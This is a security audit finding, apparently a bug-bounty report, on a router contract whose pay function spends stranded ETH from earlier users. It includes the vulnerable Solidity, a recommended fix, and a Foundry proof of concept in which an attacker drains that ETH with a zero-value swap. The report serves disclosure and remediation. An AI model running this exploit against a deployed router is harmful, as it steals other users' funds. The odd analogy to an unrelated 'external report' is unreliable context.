### Title
Stale ETH Balance in Router Used to Pay Swap Input Without Verification of Source — (`File: metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay` function in `PeripheryPayments.sol` uses the router's **entire** native ETH balance when settling a WETH-input swap, without verifying that the ETH originates from the current transaction's `msg.value`. Any ETH left in the router from a prior transaction (e.g., a user who sent excess ETH and did not call `refundETH`) can be silently consumed by a subsequent caller who sends `msg.value = 0`, giving them a free swap at the prior user's expense.

---

### Finding Description

`PeripheryPayments.pay` contains the following branch for WETH payments:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← entire router balance, not msg.value
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`address(this).balance` is the router's **total** ETH balance, not the ETH contributed by the current call. ETH accumulates in the router whenever a user calls any `payable` entry point (e.g., `exactInputSingle`, `exactInput`, `multicall`) with `msg.value` exceeding the amount actually consumed by the swap, and then does not call `refundETH` in the same transaction. [2](#0-1) 

The `receive()` guard only blocks direct ETH sends from non-WETH addresses; it does not prevent ETH from accumulating via `msg.value` in payable swap functions. [3](#0-2) 

The router's `exactInputSingle` and `exactInput` entry points are `payable` and do not enforce that `msg.value` equals `amountIn` (for WETH paths), nor do they automatically refund excess ETH. [4](#0-3) 

**Analog to the external report:** The external bug verifies that L1 deposits *are* present in `txs` (lower-bound check) but omits the upper-bound check that no *extra* deposits are included. Here, `pay` verifies that the pool *receives* the correct amount (lower-bound satisfied) but omits the check that the ETH used *comes only from the current transaction* (upper-bound on ETH source missing). In both cases, unverified extra inputs from an unauthorized source are silently accepted and exploited.

---

### Impact Explanation

**Direct loss of user principal.** Any ETH stranded in the router is freely claimable by any subsequent caller who specifies WETH as `tokenIn`. The attacker receives the full swap output (token1) while contributing zero ETH or WETH. The victim (the user who left ETH in the router) loses their entire stranded balance. There is no cap on the stolen amount; it equals whatever ETH is currently held by the router.

---

### Likelihood Explanation

ETH strands in the router in two realistic, common patterns:

1. **Direct call with excess ETH:** A user calls `exactInputSingle{value: 1000}` with `amountIn = 500` and WETH as `tokenIn`. The swap consumes 500 ETH; the remaining 500 ETH stays in the router. The user receives no automatic refund and may not know to call `refundETH` separately.

2. **Multicall without `refundETH`:** A user calls `multicall{value: X}` containing an exact-input WETH swap but omits a trailing `refundETH` call. Excess ETH is stranded.

An attacker can monitor the router's ETH balance on-chain and immediately call `exactInputSingle{value: 0}` with `tokenIn = WETH` and `amountIn` equal to the stranded amount to drain it in a single transaction.

---

### Recommendation

Track the ETH contributed by the current call and restrict `pay` to spending only that amount. One approach: record `msg.value` at entry to each payable function and pass it explicitly to `pay`, or compare `address(this).balance` before and after the call to bound the spendable ETH. Alternatively, automatically refund any unused ETH at the end of every payable entry point (analogous to Uniswap v3's `refundETH` being mandatory in the same multicall).

---

### Proof of Concept

```
// Setup: pool(WETH, token1) exists and is seeded with liquidity.

// Step 1 – Victim strands ETH in the router
vm.prank(victim);
router.exactInputSingle{value: 1000}(
    ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 500,          // only 500 consumed; 500 ETH left in router
        amountOutMinimum: 0,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
assertEq(address(router).balance, 500);  // 500 ETH stranded

// Step 2 – Attacker steals stranded ETH via a zero-value swap
uint256 attackerToken1Before = token1.balanceOf(attacker);
vm.prank(attacker);
router.exactInputSingle{value: 0}(   // attacker sends NO ETH
    ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 500,               // pay() uses router's 500 ETH balance
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
assertEq(address(router).balance, 0);                          // router drained
assertGt(token1.balanceOf(attacker), attackerToken1Before);    // attacker received token1 for free
```

The `pay` function at line 75–77 of `PeripheryPayments.sol` deposits the router's 500 ETH as WETH and transfers it to the pool, settling the attacker's swap without pulling any WETH from the attacker's address. [5](#0-4)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L57-63)
```text
  /// @inheritdoc IPeripheryPayments
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
